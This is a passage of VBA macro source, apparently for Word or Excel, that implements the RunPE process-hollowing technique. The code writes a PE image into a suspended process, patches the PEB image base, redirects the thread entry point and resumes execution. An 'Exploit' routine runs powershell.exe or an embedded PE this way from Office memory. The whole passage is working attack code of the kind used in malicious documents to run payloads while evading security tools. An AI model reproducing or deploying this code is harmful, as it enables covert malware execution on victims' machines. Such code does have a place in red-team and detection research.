            lImageBaseAddrOffset = 0 + structDOSHeader.e_lfanew + 4 + SIZEOF_IMAGE_FILE_HEADER + 28
        #End If

        'Call RtlMoveMemory(VarPtr(ptrImageBase), VarPtr(baImage(0 + lImageBaseAddrOffset)), SIZEOF_ADDRESS) ' Read current value
        'Debug.Print ("Current image base: 0x" + Hex(ptrImageBase) + " - Image base to write: 0x" + Hex(ptrProcessImageBase))
        
        Call RtlMoveMemory(VarPtr(baImage(0 + lImageBaseAddrOffset)), VarPtr(ptrProcessImageBase), SIZEOF_ADDRESS) ' Write new value
        
        'Call RtlMoveMemory(VarPtr(ptrImageBase), VarPtr(baImage(0 + lImageBaseAddrOffset)), SIZEOF_ADDRESS) ' Read current value to verify
        'Debug.Print ("New effective image base: 0x" + Hex(ptrImageBase))
    End If


    ' Allocate some memory in the current process to store the source image
    Debug.Print ("[*] Allocating memory for the source image in current process...")
    Dim ptrImageLocalCopy As LongPtr
    ptrImageLocalCopy = VirtualAlloc(0&, structNTHeaders.OptionalHeader.SizeOfImage, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    If ptrImageLocalCopy = 0 Then
        Debug.Print ("    |__ VirtualAlloc() failed (Err:" + Str(Err.LastDllError) + ").")
        Call TerminateProcess(structProcessInformation.hProcess, 0)
        Exit Sub
    Else
        If VERBOSE Then
            Debug.Print ("    |__ VirtualAlloc() OK - Got Addr: 0x" + Hex(ptrImageLocalCopy))
        End If
    End If
    
    
    ' Copy source image to local memory
    Debug.Print ("[*] Writing source image in current process...")
    If VERBOSE Then
        Debug.Print ("    |__ Target address: 0x" + Hex(ptrImageLocalCopy))

        Debug.Print ("[*] Writing PE headers...")
        Debug.Print ("    |__ Headers size:" + Str(structNTHeaders.OptionalHeader.SizeOfHeaders))
    End If
    Call RtlMoveMemory(ptrImageLocalCopy, VarPtr(baImage(0)), structNTHeaders.OptionalHeader.SizeOfHeaders)
    
    If VERBOSE Then
        Debug.Print ("[*] Writing PE sections...")
    End If
    Dim iCount As Integer
    Dim structSectionHeader As IMAGE_SECTION_HEADER
    For iCount = 0 To (structNTHeaders.FileHeader.NumberOfSections - 1)
        ' Nth section is at offset:
        '  0 (image base)
        '  + DOSHeader->e_lfanew  Image base address
        '  + 248 OR 264           IMAGE_NT_HEADERS size is 248 (32 bits) or 264 (64 bits)
        '  + N * 40               IMAGE_SECTION_HEADER is 40 (32 & 64 bits)
        Call RtlMoveMemory(VarPtr(structSectionHeader), VarPtr(baImage(structDOSHeader.e_lfanew + SIZEOF_IMAGE_NT_HEADERS + (iCount * SIZEOF_IMAGE_SECTION_HEADER))), SIZEOF_IMAGE_SECTION_HEADER)
        
        Dim strSectionName As String: strSectionName = ByteArrayToString(structSectionHeader.SecName)
        Dim ptrNewAddress As LongPtr: ptrNewAddress = ptrImageLocalCopy + structSectionHeader.VirtualAddress
        Dim lSize As Long: lSize = structSectionHeader.SizeOfRawData
        
        If VERBOSE Then
            Debug.Print ("    |__ Writing section: '" + strSectionName + "' (Size:" + Str(lSize) + ") at 0x" + Hex(ptrNewAddress))
        End If

        Call RtlMoveMemory(ptrNewAddress, VarPtr(baImage(0 + structSectionHeader.PointerToRawData)), lSize)
    Next iCount
    

    ' If the base address of the payload changed, we need to apply relocations
    Debug.Print ("[*] Applying relocations...")
    If ptrProcessImageBase <> structNTHeaders.OptionalHeader.ImageBase Then
        
        Dim lMaxSize As Long: lMaxSize = structRelocDirectory.Size
        Dim lRelocAddr As Long: lRelocAddr = structRelocDirectory.VirtualAddress
        
        Dim structReloc As IMAGE_BASE_RELOCATION
        Dim lParsedSize As Long: lParsedSize = 0
        
        Do While lParsedSize < lMaxSize
        
            Dim ptrStructReloc As LongPtr: ptrStructReloc = ptrImageLocalCopy + lRelocAddr + lParsedSize
            Call RtlMoveMemory(VarPtr(structReloc), ptrStructReloc, SIZEOF_IMAGE_BASE_RELOCATION)
            lParsedSize = lParsedSize + structReloc.SizeOfBlock
            
            If (structReloc.VirtualAddress <> 0) And (structReloc.SizeOfBlock <> 0) Then
                If VERBOSE Then
                    Debug.Print ("    |__ Relocation Block: Addr=0x" + Hex(structReloc.VirtualAddress) + " - Size:" + Str(structReloc.SizeOfBlock))
                End If
                
                Dim lEntriesNum As Long: lEntriesNum = (structReloc.SizeOfBlock - SIZEOF_IMAGE_BASE_RELOCATION) / SIZEOF_IMAGE_BASE_RELOCATION_ENTRY
                Dim lPage As Long: lPage = structReloc.VirtualAddress
                
                Dim ptrBlock As LongPtr: ptrBlock = ptrStructReloc + SIZEOF_IMAGE_BASE_RELOCATION
                Dim iBlock As Integer
                Call RtlMoveMemory(VarPtr(iBlock), ptrBlock, SIZEOF_IMAGE_BASE_RELOCATION_ENTRY)
                
                iCount = 0
                For iCount = 0 To (lEntriesNum - 1)
                    Dim iBlockType As Integer: iBlockType = ((iBlock And &HF000) / &H1000) And &HF ' type = value >> 12
                    Dim iBlockOffset As Integer: iBlockOffset = iBlock And &HFFF ' offset = value & 0xfff
                    'Debug.Print ("    |   |__ Block: Type=" + Str(iBlockType) + " - Offset=0x" + Hex(iBlockOffset))
                    
                    If iBlockType = 0 Then
                        Exit For
                    End If

                    Dim iPtrSize As Integer: iPtrSize = 0
                    If iBlockType = &H3 Then ' 32 bits address
                        iPtrSize = 4
                    ElseIf iBlockType = &HA Then ' 64 bits address
                        iPtrSize = 8
                    End If
                    
                    Dim ptrRelocateAddr As LongPtr
                    ptrRelocateAddr = ptrImageLocalCopy + lPage + iBlockOffset

                    If iPtrSize <> 0 Then
                        Dim ptrRelocate As LongPtr
                        Call RtlMoveMemory(VarPtr(ptrRelocate), ptrRelocateAddr, iPtrSize)
                        ptrRelocate = ptrRelocate - structNTHeaders.OptionalHeader.ImageBase + ptrProcessImageBase
                        Call RtlMoveMemory(ptrRelocateAddr, VarPtr(ptrRelocate), iPtrSize)
                    End If
                    
                    ptrBlock = ptrBlock + SIZEOF_IMAGE_BASE_RELOCATION_ENTRY
                    Call RtlMoveMemory(VarPtr(iBlock), ptrBlock, SIZEOF_IMAGE_BASE_RELOCATION_ENTRY)
                    
                Next iCount
            End If
        Loop
    End If
    
    
    ' Write modified image to target process memory
    Debug.Print ("[*] Writing modified source image to target process memory...")
    Dim lWriteProcessMemory As Long
    lWriteProcessMemory = WriteProcessMemory(structProcessInformation.hProcess, ptrProcessImageBase, ptrImageLocalCopy, structNTHeaders.OptionalHeader.SizeOfImage, 0&)
    If lWriteProcessMemory = 0 Then
        Debug.Print ("    |__ WriteProcessMemory() failed (Err:" + Str(Err.LastDllError) + ")")
        Call TerminateProcess(structProcessInformation.hProcess, 0)
        Exit Sub
    Else
        If VERBOSE Then
            Debug.Print ("    |__ WriteProcessMemory() OK")
        End If
    End If
    
    
    ' Free local memory
    Call VirtualFree(ptrImageLocalCopy, structNTHeaders.OptionalHeader.SizeOfImage, &H10000) ' &H10000 = MEM_FREE
    
    
    ' Applying new image base address to target PEB
    Debug.Print ("[*] Applying new image base address to target PEB...")
    Dim ptrPEBImageBaseAddr As LongPtr
    #If Win64 Then
        ptrPEBImageBaseAddr = structContext.Rdx + 16
    #Else
        ptrPEBImageBaseAddr = structContext.Ebx + 8
    #End If
    
    If VERBOSE Then
        Debug.Print ("    |__ Image base address location: 0x" + Hex(ptrPEBImageBaseAddr))
        Debug.Print ("    |__ Image base address: 0x" + Hex(ptrProcessImageBase))
    End If
    
    lWriteProcessMemory = WriteProcessMemory(structProcessInformation.hProcess, ptrPEBImageBaseAddr, VarPtr(ptrProcessImageBase), SIZEOF_ADDRESS, 0&)
    If lWriteProcessMemory = 0 Then
        Debug.Print ("    |__ WriteProcessMemory() failed (Err:" + Str(Err.LastDllError) + ")")
        Call TerminateProcess(structProcessInformation.hProcess, 0)
        Exit Sub
    Else
        If VERBOSE Then
            Debug.Print ("    |__ WriteProcessMemory() OK")
        End If
    End If
    
    
    ' Overwrite context with new entry point
    Debug.Print ("[*] Overwriting context with new entry point...")
    Dim ptrEntryPoint As LongPtr: ptrEntryPoint = ptrProcessImageBase + structNTHeaders.OptionalHeader.AddressOfEntryPoint
    #If Win64 Then
        structContext.Rcx = ptrEntryPoint
    #Else
        structContext.Eax = ptrEntryPoint
    #End If
    
    If VERBOSE Then
        Debug.Print ("    |__ New entry point: 0x" + Hex(ptrEntryPoint))
    End If
    
    Dim lSetThreadContext As Long
    #If Win64 Then
        Call RtlMoveMemory(VarPtr(baContext(0)), VarPtr(structContext), LenB(structContext))
        lSetThreadContext = SetThreadContext(structProcessInformation.hThread, VarPtr(baContext(0)))
    #Else
        lSetThreadContext = SetThreadContext(structProcessInformation.hThread, structContext)
    #End If
    If lSetThreadContext = 0 Then
        Debug.Print ("    |__ SetThreadContext() failed (Err:" + Str(Err.LastDllError) + ")")
        Call TerminateProcess(structProcessInformation.hProcess, 0)
        Exit Sub
    Else
        If VERBOSE Then
            Debug.Print ("    |__ SetThreadContext() OK")
        End If
    End If
    
    
    ' Resume thread
    ' |__ If ResumeThread succeeds, the return value is the thread's previous suspend count (i.e. 1 in this case)
    Debug.Print ("[*] Resuming suspended process...")
    Dim lResumeThread As Long
    lResumeThread = ResumeThread(structProcessInformation.hThread)
    If lResumeThread = 1 Then
        If VERBOSE Then
            Debug.Print ("    |__ ResumeThread() OK")
        End If
    Else
        Debug.Print ("    |__ ResumeThread() failed (Err:" + Str(Err.LastDllError) + ")")
        Call TerminateProcess(structProcessInformation.hProcess, 0)
        Exit Sub
    End If

    Debug.Print ("[+] RunPE complete!!!")
    
End Sub

' --------------------------------------------------------------------------------
' Method:    Exploit
' Desc:      Calls FileToByteArray to get the content of a PE file as a Byte
'               array and calls the RunPE procedure to execute it from the memory
'               of Word / Excel
' Arguments: N/A
' Returns:   N/A
' --------------------------------------------------------------------------------
Public Sub Exploit()

    Debug.Print ("================================================================================")
    
    Dim strSrcFile As String
    Dim baSrcFileContent() As Byte
    Dim strSrcArguments As String
    Dim strSrcPE As String
    
    'strSrcFile = "C:\Windows\System32\cmd.exe"
    strSrcFile = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    
    'strSrcFile = "C:\Windows\SysWOW64\cmd.exe"
    'strSrcFile = "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
    
    strSrcArguments = ""
    'strSrcArguments = "-exec Bypass"
    
    strSrcPE = PE()
    If strSrcPE = "" Then
        If Dir(strSrcFile) = "" Then
            Debug.Print ("[-] '" + strSrcFile + "' doesn't exist.")
            Exit Sub
        Else
            Debug.Print ("[*] Source file: '" + strSrcFile + "'")
            If VERBOSE Then
                Debug.Print ("    |__ Command line: " + strSrcFile + " " + strSrcArguments)
            End If
        End If
        baSrcFileContent = FileToByteArray(strSrcFile)
        Call RunPE(baSrcFileContent, strSrcArguments)
    Else
        Debug.Print ("[+] Source file: embedded PE")
        baSrcFileContent = StringToByteArray(strSrcPE)
        Call RunPE(baSrcFileContent, strSrcArguments)
    End If

End Sub
